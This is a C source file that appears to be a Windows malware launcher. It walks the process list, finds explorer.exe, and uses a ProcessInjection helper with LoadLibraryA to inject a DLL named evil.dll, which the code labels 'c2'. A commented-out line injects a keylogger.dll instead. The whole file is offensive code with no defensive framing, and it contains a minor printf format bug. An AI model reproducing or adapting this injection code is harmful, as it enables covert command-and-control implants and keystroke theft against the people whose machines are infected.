#include "process_injection.h"

int main() {
    const char* c2 = ".\\evil.dll";
    const char* keylog = ".\\keylogger.dll";

    char fullEvilPath[MAX_PATH];

    GetFullPathNameA(
        ".\\evil.dll",
        MAX_PATH,
        fullEvilPath,
        NULL
    );

    char fullKeylogPath[MAX_PATH];

    GetFullPathNameA(
        ".\\keylogger.dll",
        MAX_PATH,
        fullKeylogPath,
        NULL
    );
    // printf(fullEvilPath);
    // MessageBoxA(
    //         NULL,
    //         fullEvilPath,
    //         "Success",
    //         MB_OK
    //     );


    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process={0};
    process.dwSize = sizeof(PROCESSENTRY32W);

    if (snapshot == INVALID_HANDLE_VALUE)
    {
        printf("Snapshot failed: %lu\n", GetLastError());
        fflush(stdout);
        // scanf("snapshot failed", &i);
        return 1;
    }

    BOOL isFirstProcessSuccessful = Process32First(snapshot, &process);

    if (!isFirstProcessSuccessful){
        printf("Process32FirstW failed: ", GetLastError());
        fflush(stdout);
        // scanf("process32first failed", &i);
        
        return 1;
    }
    
    if (isFirstProcessSuccessful){
        do {
            if (strcmp(process.szExeFile, "explorer.exe") == 0){
                printf("Found explorer. Attempting to inject into explorer.exe\n");
                DWORD explorerProcId = process.th32ProcessID;
                ProcessInjection(explorerProcId, strlen(fullEvilPath) + 1, fullEvilPath, "kernel32.dll", "LoadLibraryA");
                // ProcessInjection(explorerProcId, strlen(fullKeylogPath) + 1, fullKeylogPath, "kernel32.dll", "LoadLibraryA");
                return 0;
            }

        } while (Process32Next(snapshot, &process));

    }
    
    CloseHandle(snapshot);
    return 0;
}